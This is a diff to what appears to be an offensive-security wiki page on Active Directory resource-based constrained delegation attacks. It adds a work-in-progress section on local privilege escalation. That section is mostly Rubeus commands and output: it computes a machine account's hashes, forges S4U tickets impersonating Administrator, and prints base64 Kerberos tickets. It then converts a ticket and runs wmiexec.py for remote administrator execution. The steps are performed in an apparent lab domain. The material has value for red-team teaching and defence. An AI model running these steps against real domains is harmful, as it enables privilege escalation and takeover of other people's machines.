@@ -147,7 +147,7 @@ It's worth remembering that in some AD environments there will be highly privile
 * Use service account's certificate to request its Kerberos TGT;
 * You've now gained administrative privileges on machines the compromised service account can access.
 
-## Remote Computer Take Over
+## RBCD: Remote Computer Take Over
 
 It's also possible to gain administrative privileges over any remote computer given we have network access to that computer, as pointed out by Lee Christensen:
 
@@ -375,6 +375,113 @@ int main()
 Below shows `WebClient` service is not running on `WS01` and we cannot start it, however, executing the above code \(`webclient.cpp` compiled as `webclient.exe`\) kicks off the `WebClient` service for us:
 
 ![Forcing the WebClient service to run](../../.gitbook/assets/image%20%281053%29.png)
+
+## RBCD: Local Computer Take Over / Local Privilege Escalation
+
+{% hint style="info" %}
+WIP
+{% endhint %}
+
+```text
+PS C:\Users\spotless\Desktop> .\Rubeus.exe hash /domain:offense.local /user:QUAIIVVE$ /password:"K_-Jzsb&uK!``TIH"
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v1.6.4
+
+
+[*] Action: Calculate Password Hash(es)
+
+[*] Input password             : K_-Jzsb&uK!`TIH
+[*] Input username             : QUAIIVVE$
+[*] Input domain               : offense.local
+[*] Salt                       : OFFENSE.LOCALhostquaiivve.offense.local
+[*]       rc4_hmac             : 3F55290748348504327CDA267FCCA190
+[*]       aes128_cts_hmac_sha1 : C0CB489DC3C96151AC20AD6E2A2EC160
+[*]       aes256_cts_hmac_sha1 : E73CA03A03704931A928806FDBA8993FDA47404A4EA1F66BA1A64EFD90AA5F69
+[*]       des_cbc_md5          : A8B625105779671C
+```
+
+![](../../.gitbook/assets/image%20%281058%29.png)
+
+```text
+PS C:\Users\spotless\Desktop> .\Rubeus.exe s4u /user:QUAIIVVE$ /aes256:E73CA03A03704931A928806FDBA8993FDA47404A4EA1F66BA1A64EFD90AA5F69 /impersonateuser:Administrator /msdsspn:host/ws01.offense.local /altservice:cifs /nowrap /ptt
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v1.6.4
+
+[*] Action: S4U
+
+[*] Using aes256_cts_hmac_sha1 hash: E73CA03A03704931A928806FDBA8993FDA47404A4EA1F66BA1A64EFD90AA5F69
+[*] Building AS-REQ (w/ preauth) for: 'offense.local\QUAIIVVE$'
+[+] TGT request successful!
+[*] base64(ticket.kirbi):
+
+      doIFIjCCBR6gAwIBBaEDAgEWooIEIzCCBB9hggQbMIIEF6ADAgEFoQ8bDU9GRkVOU0UuTE9DQUyiIjAgoAMCAQKhGTAXGwZrcmJ0Z3QbDW9mZmVuc2UubG9jYWyjggPZMIID1aADAgESoQMCAQKiggPHBIIDwwZceX7rzd6MgVy9Sp4ojTXQP5wVAuFouB0dIiYddAwR2292F6slGNoWvLGD50UnPxiNh3uTvYabPTdD4opUY498Sraj9ObM0/mL812DVYqO1bw7MdcWGKRl429SaW/Of8Prvn5DplNVV7Guv/3/HhIGpUNCdWs/CSm22EE8gHTNuy0Csbm/NhR5pvptMyxpFtUve52f4sxdQ2S9C2gY+Q5mKC6yW5dE3r5SHZd0J0rMp0p/wVIrtlTvZyDEfm9Vnk8EtqcS5JrtD92OZdhtfhMYtBdPOM8qrwKrz0/pHQv+VARUq2CuKr9bHaJ9perELUN8LUCQV4mRsMPB9BREXQEOk7BR9SN97g5r27jWT4xWKJFprXj+lUq2hPEyQLMG4ty4ACqv1pzmRT29VPJeA/SZXPraMkBtfcbaX3PX2XCuWP7FLxO9EcTIqNMrOM15woCLL5l18k2Z2laOMAPjsRThqRPDRHSHW01BffxiG8kAkvwW9MC/9nukUshpgNByVOgEpPFmkHAcPH9+P/QSikqsJk9mQ6ZUcvsX2nHnfFKUe+stpqilOPoxWN9yOgMuQoBddfuhQ97PStqNkRlIxffMSf61w1Yvwmh5zL8lzg+ylnqN3RfBZ8j6WJ29bZWSgjrullnowTAuU45jLIWjAGVm6JZU8XfVHMwclCI+mFZbrN6p4ms3u54o7ha28Wj5Z84pfkghl5kGE8blFzplvQ9SXbVKYxLDBSLx7AyweUdAf211gaq8UeuikWRj3IWOmqvUg3WHDNVjB5i3H1AU71OQcyKQrLB4ThLWw/Ik9VpgDjkeUpy04VRIFZhr4YccMM3flLkrw1yUtTce+AGQaZEiDMsbFb6e943DzWW3Dok90s60FCc54izuXikpqYImtZS6kFyTstYmwulj6sMl8wjSoS1fnLvJW3fJk1Z1Go+eDxzfpZu/C+vvGScyl94HkLE/qy3iTSj5UMtoDMiGImlFO0+4RJMZaoxDiQA/q/IhX5RzLSGSinl+MR7smqkJqQMrgtKTw4XWa0G6tcisKTXBIKF5qhLPhf0hPE8hell40cJFAU4pOr7EIVrLdZzj0ygCg+1yWHyoQ0QBywlPqcSdAJzT4EreLxSWq72qB373AiLDvtHR2duzqmrWQG7pL+SSc1ySN5PaQ88AsuT5z9YDEGDEjR+rqqi91B3kOgZKbPCZKABroljUnFyQ9Y5dbn+KUr8Zz+jxkHw5vEgQ4sxbJndVum4/uAObv/jnyv94PuU+d7VhRIUYvMhg1pilQPOeC6OB6jCB56ADAgEAooHfBIHcfYHZMIHWoIHTMIHQMIHNoCswKaADAgESoSIEIL6+8li8w8EpUu/s9n5HRvCeWxNCmjzJ0B3XDi7BldVooQ8bDU9GRkVOU0UuTE9DQUyiFjAUoAMCAQGhDTALGwlRVUFJSVZWRSSjBwMFAEDhAAClERgPMjAyMTA4MDUyMTM1MDZaphEYDzIwMjEwODA2MDczNTA2WqcRGA8yMDIxMDgxMjIxMzUwNlqoDxsNT0ZGRU5TRS5MT0NBTKkiMCCgAwIBAqEZMBcbBmtyYnRndBsNb2ZmZW5zZS5sb2NhbA==
+
+
+[*] Action: S4U
+
+[*] Using domain controller: dc01.offense.local (10.0.0.6)
+[*] Building S4U2self request for: 'QUAIIVVE$@OFFENSE.LOCAL'
+[*] Sending S4U2self request
+[+] S4U2self success!
+[*] Got a TGS for 'Administrator' to 'QUAIIVVE$@OFFENSE.LOCAL'
+[*] base64(ticket.kirbi):
+
+      doIFVjCCBVKgAwIBBaEDAgEWooIEbzCCBGthggRnMIIEY6ADAgEFoQ8bDU9GRkVOU0UuTE9DQUyiFjAUoAMCAQGhDTALGwlRVUFJSVZWRSSjggQxMIIELaADAgEXoQMCAQGiggQfBIIEG7pIIqtIfCHKYJ41k2k+R5rEA9Xs+9hdpOyBseCmS6+7UKUAfDHoNuugUXdrP0sAczQS/dsImnKzE2rWwV0sutCPVBD0RtmZRTN3RqI5WSODF5yQH/WPO8YyCD1ZxLOdHrJctk/Kq8ElX6esRKqrsQDyJTxpJ4HCfIDEyT92Iyhg6Xr7qOrlqYZMEFOunRK/YrvF/EeFmfT7p80PTp5uy4qOsS1zZVB3QOFnV7ocVS2AUq/Ds/rEIRK896c6oAlokl60d/Gh5ori05srnzeqX0Ym1n5aDNKF4ImnD4ec6kYTjahds++6PjqQ2RdOyVTH7Gyq3Jsjlo0QVtxB1noqk4W1XbQ7dpyzjIXhSehiM5d6gES1u1iu+X0WWa+sYlSFgIV1U1Li+jk+1os2BX9OtpkZPdQF9oObZsUj0vwysyg21CoiM2tbZX5nvVca4XKfqF+EItG1PEImse3WDWT+xA3zTWiw+FZ2n0rzcY4hu67xvXW92ddjJAXPJqmOaUeDpbc2s1adFl8SKTgn5ec3pr4W4bRPTEgLHZRr+6fF7olvzNdY+V8RBZizfd3rIC7SBVBHuDl1IeUs+NVUz5293QxnCipntmhebEFjezLVvvHdbsyFXYf8y5WciN2+d95j5WCTX9bGhUKlGBbCJvamtlFZhrSvMZiIPLP6bGesI6mgXnK78X2gvlZcCCV+5a/rxCP/EaytNTGXbSo3aPHz6e7Czh8OuaKrmUPo7cLR2ZzurmUneVfyoVl0vQtL0ngwKC3ze2zhCX12u33JFY21VfnBHxQB79egNWe+IgKmqDk96/JBfAuJ7fYMob/ftchappSqMOerbkB0bZACSwbLkrngiZ8RhQ8iB07r/zd/ou+bStFa1QayJovGiC3s1tdhJcqQ5S0WadDdIELrJClYpSP30brFaIbxweiQl6H/WzPySiCd/hzUvXuvhDSwXV5960mllFSMxBkIhf81yCE67/ivUkZbSEOFunP8FbvCjHz23o10K4nEs6WqGavWBbUznX1KyvFPDem0+ELMxIrO2dqgjsBs+CVzm4dRi0WQr/VBbxArL6nxBxTey9HFZf1HZX3+XesrXUZBVfVyIwB1d0a2MmId00sOKhiZtnLwdb9OHBS4RU5HV70hlEZFOH4WSY6Pbv4e5ExxJOSeOGq8Ysh7Ex9WyEVcbVHXtmNalJGfxnvtjp4uF35Uvkg1zzFxCYG5XE+9tCn/QCl94xsiDGyYWwTqstXiGBoIZtDCs89RfWWo9NWqG1isKdPy9NQSq3htM1YjS9gv7G9b7YJaRNwgeb5s1Y1YqDDdaYGC3yfRnqrHStokGo8OSLwKD+F2ZQuQgODQiY7PfhBq5jCKpvAiTomwL43OxKswMBB4r+0XWrL0sZin8d7SUr6jgdIwgc+gAwIBAKKBxwSBxH2BwTCBvqCBuzCBuDCBtaAbMBmgAwIBF6ESBBD1cF+spxbTXDsrdF5xIsmdoQ8bDU9GRkVOU0UuTE9DQUyiGjAYoAMCAQqhETAPGw1BZG1pbmlzdHJhdG9yowcDBQAAoQAApREYDzIwMjEwODA1MjEzNTA2WqYRGA8yMDIxMDgwNjA3MzUwNlqnERgPMjAyMTA4MTIyMTM1MDZaqA8bDU9GRkVOU0UuTE9DQUypFjAUoAMCAQGhDTALGwlRVUFJSVZWRSQ=
+
+[*] Impersonating user 'Administrator' to target SPN 'host/ws01.offense.local'
+[*]   Final ticket will be for the alternate service 'cifs'
+[*] Using domain controller: dc01.offense.local (10.0.0.6)
+[*] Building S4U2proxy request for service: 'host/ws01.offense.local'
+[*] Sending S4U2proxy request
+[+] S4U2proxy success!
+[*] Substituting alternative service name 'cifs'
+[*] base64(ticket.kirbi) for SPN 'cifs/ws01.offense.local':
+
+      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
+[+] Ticket successfully imported!
+```
+
+![](../../.gitbook/assets/image%20%281061%29.png)
+
+```text
+echo "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" | base64 -d > admin.kirbi
+```
+
+![](../../.gitbook/assets/image%20%281062%29.png)
+
+```text
+examples/ticketConverter.py ../admin.kirbi admin.ccache
+```
+
+![](../../.gitbook/assets/image%20%281056%29.png)
+
+```text
+export KRB5CCNAME=admin.ccache
+```
+
+![](../../.gitbook/assets/image%20%281057%29.png)
+
+```text
+examples/wmiexec.py -k -no-pass offense.local/administrator@ws01.offense.local
+```
+
+![](../../.gitbook/assets/rbcd-local-privilege-escalation.gif)
+
+![](../../.gitbook/assets/image%20%281060%29.png)
 
 ## References
 
